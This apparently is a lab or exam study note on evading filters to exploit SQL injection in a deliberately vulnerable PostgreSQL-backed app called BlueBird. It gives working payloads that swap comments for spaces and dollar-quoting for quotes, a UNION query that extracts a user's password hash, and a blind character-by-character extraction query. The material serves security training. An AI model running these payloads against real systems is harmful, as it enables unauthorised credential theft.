# Common Character Bypasses for SQL Injection

When WAFs, regex filters, or character whitelists block standard payloads, PostgreSQL gives you alternative syntax to work around them.

---

## The Filter (BlueBird /find-user)

```java
Pattern p = Pattern.compile("'|(.*'.*'.*)");
Matcher m = p.matcher(u);
String u2 = u.toLowerCase();
if (!u2.contains(" ") && !m.matches()) { ... }
```

Two restrictions:
1. **No spaces** — `.contains(" ")`
2. **No single quotes** — regex blocks `'` and strings with two single quotes

Critical flaw: `Matcher.matches()` requires the **entire string** to match the pattern. A single `'` mid-string (like `a'--`) does NOT match `'|(.*'.*'.*)` because the pattern only matches a lone `'` or a string with TWO quotes — `a'--` has only one quote and is longer than `'`. So you can sneak in exactly one quote.

---

## Bypass 1: Spaces → `/**/`

PostgreSQL treats empty multi-line comments as whitespace:

```sql
-- Original:
' AND 1=1--

-- Bypass:
'/**/AND/**/1=1--
```

---

## Bypass 2: Single Quotes → Dollar-Quoted Strings `$$...$$`

PostgreSQL supports dollar-quoting as an alternative string delimiter:

```sql
-- Original:
' UNION SELECT 1,'foo',3--

-- Bypass:
'/**/UNION/**/SELECT/**/1,$$foo$$,3--
```

Dollar-quoted strings: `$$string$$` or `$tag$string$tag$` — no single quotes needed.

---

## Union-Based Extraction (6 columns)

The users table has 6 columns: `id, username, password, email, name, description`.

Full working payload (spaces and quotes bypassed):
```
'/**/UNION/**/SELECT/**/1,(SELECT/**/password/**/FROM/**/users/**/WHERE/**/email=$$target@email.com$$),$$x$$,$$x@x.com$$,$$x$$,$$x$$--
```

The injected value lands in the `username` position and renders in the search results.

URL-encoded example:
```
/find-user?u=%27%2F**%2FUNION%2F**%2FSELECT%2F**%2F1%2C%28SELECT...
```

---

## Comparative Precomputation (1 char per request, blind)

Instead of bisecting bits, compare the ID column directly to an ASCII value:

```sql
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$bmdyy$$)--
```

- Only one user will be returned: the user whose `id` equals the ASCII code of the target character.
- BCrypt hashes start with `$` (ASCII 36) → user with `id=36` appears if first char is `$`.
- One confirmed character per request — faster than bisection for short alphabets.

---

## PostgreSQL-Specific Syntax Quick Reference

| Need | Standard SQL | PostgreSQL Bypass |
|------|-------------|-------------------|
| Space | ` ` | `/**/` |
| String literal | `'foo'` | `$$foo$$` or `$x$foo$x$` |
| Sleep | `SLEEP(n)` | `pg_sleep(n)` |
| String concat | `+` | `\|\|` or `CONCAT()` |

---

## Verifying via PG Logs

When developing payloads, tail the log to see exactly what SQL is being executed:

```bash
sudo tail -f /opt/bluebird/pg_log/postgresql-*.log
```

Errors like `each UNION query must have the same number of columns` tell you exactly what to fix without needing an out-of-band channel.
